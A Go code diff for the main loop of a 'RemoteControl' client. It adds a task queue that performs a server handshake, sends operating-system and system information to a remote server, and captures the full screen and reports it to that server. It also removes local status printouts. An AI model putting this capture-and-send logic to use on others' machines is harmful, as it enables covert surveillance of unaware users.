@@ -2,6 +2,7 @@ package main
 
 import (
 	"RemoteControl/pkg/remote"
+	"RemoteControl/pkg/runtime"
 	"RemoteControl/pkg/shared"
 	"fmt"
 	"io/ioutil"
@@ -30,31 +31,24 @@ func Post(url string, contentType string, body []byte) (string, error) {
 var taskAry []string
 
 func main() {
-	taskAry = append(taskAry, "png")
-	taskAry = append(taskAry, "png")
-	taskAry = append(taskAry, "png")
-	shared.Print("检查运行环境：")
-	//osid, osName := runtime.GetSystem()
-	//shared.Print(fmt.Sprintf("    操作系统：%s\n", osName))
-	GIsLinkingWithServer = remote.TestServerLink()
-	if GIsLinkingWithServer {
-		fmt.Printf("    确认服务器连接情况：%s\n", "在线")
-		//shared.Print(fmt.Sprintf("    确认服务器连接情况：%s\n", "在线"))
-	} else {
-		fmt.Printf("    确认服务器连接情况：%s\n", "离线")
-		//shared.Print(fmt.Sprintf("    确认服务器连接情况：%s\n", "离线"))
-	}
+	taskAry = append(taskAry, []string{
+		shared.TASK_HANDSHAKE,
+		shared.TASK_SYSTEMINFO,
+		shared.TASK_CAPTURESCREEN}...,
+	)
+
 	for GIsLinkingWithServer {
-		// send os infomation
-		//>>> remote.SendMsg(fmt.Sprintf("操作系统：%s\n", osName))
-		// send the system infomation to the server
-		//>>>> remote.SendMsg(runtime.GetSystemInfo(osid))
-		// 截图
 		if len(taskAry) > 0 {
 			task := taskAry[0]
 			taskAry = taskAry[1:]
 			switch task {
-			case "png":
+			case shared.TASK_HANDSHAKE:
+				GIsLinkingWithServer = remote.TestServerLink()
+			case shared.TASK_SYSTEMINFO:
+				osid, osName := runtime.GetSystem()
+				remote.SendMsg(fmt.Sprintf("操作系统：%s\n", osName))
+				remote.SendMsg(runtime.GetSystemInfo(osid))
+			case shared.TASK_CAPTURESCREEN:
 				filename := remote.CaptureFullScreen()
 				filesize := strconv.FormatInt(remote.GetFileSize(filename), 10)
 				remote.SendMsg("screen_" + filename + "_" + filesize)
@@ -63,6 +57,5 @@ func main() {
 				remote.GConn.Close()
 			}
 		}
-
 	}
 }
